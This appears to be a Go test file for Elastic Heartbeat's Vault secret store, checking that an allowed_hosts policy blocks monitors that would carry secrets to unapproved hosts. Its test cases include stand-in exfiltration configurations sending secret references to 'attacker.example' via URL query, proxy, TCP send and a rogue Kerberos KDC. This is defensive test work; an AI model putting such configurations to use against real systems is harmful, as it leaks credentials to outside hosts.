// Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
// or more contributor license agreements. Licensed under the Elastic License;
// you may not use this file except in compliance with the Elastic License.

package vault

import (
	"maps"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	conf "github.com/elastic/elastic-agent-libs/config"
	"github.com/elastic/elastic-agent-libs/logp/logptest"

	"github.com/elastic/beats/v7/heartbeat/monitors/plugin"
	"github.com/elastic/beats/v7/heartbeat/monitors/secretstores"

	// Register the monitor types whose destinations are checked.
	_ "github.com/elastic/beats/v7/heartbeat/monitors/active/http"
	_ "github.com/elastic/beats/v7/heartbeat/monitors/active/tcp"
)

// TestAllowedHosts checks allowed_hosts with the Vault store and the real
// monitor plugins.
func TestAllowedHosts(t *testing.T) {
	const (
		ref    = "vault://prod@myapp/creds#password"
		urlRef = "vault://prod@myapp/target#url"
	)
	fv := newFakeVault(t)
	fv.secrets["myapp/target"] = map[string]any{"url": "https://attacker.example/"}

	tests := []struct {
		name    string
		monitor map[string]any
		wantErr string
	}{
		{
			name:    "allowed host",
			monitor: map[string]any{"type": "http", "urls": []any{"https://api.stripe.com/v1/charges"}, "check.request.headers": map[string]any{"Authorization": "Bearer " + ref}},
		},
		{
			name:    "reference in the query of an allowed host",
			monitor: map[string]any{"type": "http", "urls": []any{"https://api.stripe.com/?k=" + ref}},
		},
		{
			name:    "exfiltration through the url",
			monitor: map[string]any{"type": "http", "urls": []any{"https://attacker.example/?k=" + ref}},
			wantErr: `secret_stores: connection "prod": not allowed by allowed_hosts: the monitor connects to a host that is not allowed`,
		},
		{
			name:    "reference as the url",
			monitor: map[string]any{"type": "http", "urls": []any{urlRef}},
			wantErr: "a host that is not allowed",
		},
		{
			name:    "redirects",
			monitor: map[string]any{"type": "http", "urls": []any{"https://api.stripe.com/"}, "max_redirects": 3, "check.request.body": ref},
			wantErr: "not allowed by allowed_hosts: max_redirects must be 0",
		},
		{
			name: "kerberos",
			monitor: map[string]any{"type": "http", "urls": []any{"https://api.stripe.com/"}, "kerberos": map[string]any{
				"auth_type": "password",
				"username":  "u",
				"password":  ref,
				"realm":     "EVIL.EXAMPLE",
				"krb5_conf": "[realms]\n  EVIL.EXAMPLE = { kdc = attacker.example:88 }\n",
			}},
			wantErr: "kerberos is not supported",
		},
		{
			name:    "proxy not allowed",
			monitor: map[string]any{"type": "http", "urls": []any{"https://api.stripe.com/"}, "proxy_url": "http://attacker.example:3128", "password": ref},
			wantErr: "a host that is not allowed",
		},
		{
			name:    "tcp",
			monitor: map[string]any{"type": "tcp", "hosts": []any{"attacker.example:443"}, "check.send": ref},
			wantErr: "a host that is not allowed",
		},
		{
			name:    "browser",
			monitor: map[string]any{"type": "browser", "params": map[string]any{"key": ref}},
			wantErr: `monitor type "browser" is not supported`,
		},
		{
			name:    "connection not referenced",
			monitor: map[string]any{"type": "browser", "params": map[string]any{"key": "no secret"}},
		},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			entry := tokenEntry(fv.address)
			entry["type"], entry["name"], entry["allowed_hosts"] = storeType, "prod", []any{"api.stripe.com"}
			m := map[string]any{secretstores.ConfigKey: []any{entry}}
			maps.Copy(m, tc.monitor)
			cfg, err := conf.NewConfigFrom(m)
			require.NoError(t, err, "test config must be valid")

			// Browser is not registered: like it, it has no Destinations.
			var destinations plugin.DestinationsFunc
			monitorType, err := cfg.String("type", -1)
			require.NoError(t, err, "test config must have a type")
			if pf, ok := plugin.GlobalPluginsReg.Get(monitorType); ok {
				destinations = pf.Destinations
			}

			_, err = secretstores.NewResolver(logptest.NewTestingLogger(t, "")).Resolve(cfg, destinations)
			if tc.wantErr == "" {
				assert.NoError(t, err, "the monitor must be allowed")
				return
			}
			assert.ErrorContains(t, err, tc.wantErr, "the monitor must be rejected")
			assert.ErrorIs(t, err, secretstores.ErrNotAllowed, "the error must be a policy error")
			assert.NotContains(t, err.Error(), "attacker.example", "a resolved host may be a secret and must not be named")
		})
	}
}
